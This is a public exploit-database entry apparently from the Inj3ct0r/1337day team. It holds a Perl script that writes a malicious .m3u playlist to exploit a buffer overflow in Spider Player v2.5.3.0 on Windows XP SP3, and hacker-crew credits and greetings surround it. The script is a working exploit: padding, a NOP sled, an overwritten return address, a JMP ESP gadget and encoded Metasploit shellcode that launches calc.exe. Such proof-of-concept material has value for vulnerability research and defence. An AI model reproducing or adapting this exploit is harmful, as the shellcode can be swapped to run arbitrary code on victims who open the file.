1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Spider Player v2.5.3.0 (.m3u) Buffer Overflow Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * www.dis9.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Buffer Overflow (in version 2.5.3.0)
# Tested on : Windows XP SP3 (Fr)
##
# [Indoushka & SeeMe & L0rd CrusAd3r] => Welcome back Br0ther's <3 ^^ <3
##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3  |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * T0xic |
# | ------------------------------------------------ < |
# + All Dz .. This is Open Group 4 L33T Dz Hax3rZ ..
###

#----------------------[ Exploit Code ]----------------=>

#!/usr/bin/perl
#-----------------
print "\n> Spider Player v2.5.3.0 (.m3u) Buffer Overflow Exploit <\n";
my $junk = "\x41" x 31337;
my $nops = "\x90" x 55;
my $buf = "\x41\x42\x43\x44" x 3 ;
#-----------------
# windows/exec - 511 bytes (http://www.metasploit.com)
# Encoder: x86/alpha_mixed
# EXITFUNC=process, CMD=calc.exe
my $shellcode = 
"\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" .
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" .
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" .
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" .
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" .
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" .
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x49" .
"\x78\x4c\x49\x45\x50\x43\x30\x47\x70\x45\x30\x4e\x69\x49" .
"\x75\x50\x31\x49\x42\x43\x54\x4e\x6b\x43\x62\x46\x50\x4e" .
"\x6b\x43\x62\x46\x6c\x4c\x4b\x42\x72\x44\x54\x4e\x6b\x50" .
"\x72\x45\x78\x44\x4f\x4d\x67\x43\x7a\x45\x76\x46\x51\x4b" .
"\x4f\x45\x61\x4f\x30\x4c\x6c\x47\x4c\x50\x61\x43\x4c\x44" .
"\x42\x44\x6c\x47\x50\x4a\x61\x4a\x6f\x46\x6d\x47\x71\x4b" .
"\x77\x4b\x52\x4c\x30\x43\x62\x51\x47\x4e\x6b\x51\x42\x44" .
"\x50\x4c\x4b\x47\x32\x45\x6c\x47\x71\x48\x50\x4e\x6b\x51" .
"\x50\x51\x68\x4c\x45\x4f\x30\x42\x54\x51\x5a\x43\x31\x48" .
"\x50\x50\x50\x4e\x6b\x50\x48\x45\x48\x4c\x4b\x46\x38\x51" .
"\x30\x47\x71\x4a\x73\x4b\x53\x47\x4c\x43\x79\x4e\x6b\x45" .
"\x64\x4e\x6b\x43\x31\x49\x46\x44\x71\x49\x6f\x45\x61\x4f" .
"\x30\x4c\x6c\x4b\x71\x48\x4f\x46\x6d\x47\x71\x4a\x67\x45" .
"\x68\x49\x70\x51\x65\x4c\x34\x44\x43\x43\x4d\x4a\x58\x47" .
"\x4b\x43\x4d\x46\x44\x50\x75\x4a\x42\x51\x48\x4c\x4b\x43" .
"\x68\x51\x34\x43\x31\x4a\x73\x42\x46\x4c\x4b\x46\x6c\x42" .
"\x6b\x4c\x4b\x50\x58\x45\x4c\x45\x51\x4e\x33\x4e\x6b\x45" .
"\x54\x4e\x6b\x43\x31\x4e\x30\x4c\x49\x50\x44\x45\x74\x46" .
"\x44\x43\x6b\x43\x6b\x43\x51\x42\x79\x42\x7a\x46\x31\x4b" .
"\x4f\x49\x70\x51\x48\x51\x4f\x50\x5a\x4c\x4b\x45\x42\x4a" .
"\x4b\x4d\x56\x51\x4d\x51\x7a\x43\x31\x4c\x4d\x4d\x55\x4c" .
"\x79\x47\x70\x45\x50\x45\x50\x46\x30\x45\x38\x44\x71\x4c" .
"\x4b\x50\x6f\x4e\x67\x49\x6f\x48\x55\x4d\x6b\x4a\x50\x4e" .
"\x55\x49\x32\x43\x66\x42\x48\x4c\x66\x4c\x55\x4d\x6d\x4d" .
"\x4d\x49\x6f\x4e\x35\x45\x6c\x47\x76\x43\x4c\x47\x7a\x4b" .
"\x30\x49\x6b\x4d\x30\x43\x45\x43\x35\x4d\x6b\x51\x57\x46" .
"\x73\x44\x32\x50\x6f\x42\x4a\x45\x50\x51\x43\x49\x6f\x4b" .
"\x65\x51\x73\x43\x51\x42\x4c\x51\x73\x44\x6e\x50\x65\x44" .
"\x38\x43\x55\x43\x30\x41\x41";
#-----------------
my $eip = "\x7C\x91\xE5\x14\x90\x90"; # JL SHORT / IN EAX / NOP / NOP
my $esp = "\x07\xd5\xc5\x7c"; # JMP ESP (shell32.dll)
#-----------------
$exploit = $junk.$nops.$eip.$buf."\x90" x 11 .$esp.$shellcode;
#-----------------
print "\n[*] Creating Exploit File ...\n";
open($DZ ,">DzOffendersCr3w.m3u");
print $DZ $exploit;
close($DZ);
#-----------------
print "[+] Exploit File Created (^_^) By KedAns-Dz !\n";

#-------------------------[ End ]-----------------------<<

# | >> --------+++=[ Dz Offenders Cr3w ]=+++------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3  |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * T0xic |
# | ------------------------------------------------ < |

#================[ Exploited By KedAns-Dz * Inj3ct0r * ]========================================= 
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * HMD 1850 BBs (all)
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team)
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * T0xic * www.packetstormsecurity.org * TreX (hotturks.org)
# www.metasploit.com * Underground Exploitation (www.dis9.com) * All Security and Exploits Webs ..
# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
#=============================================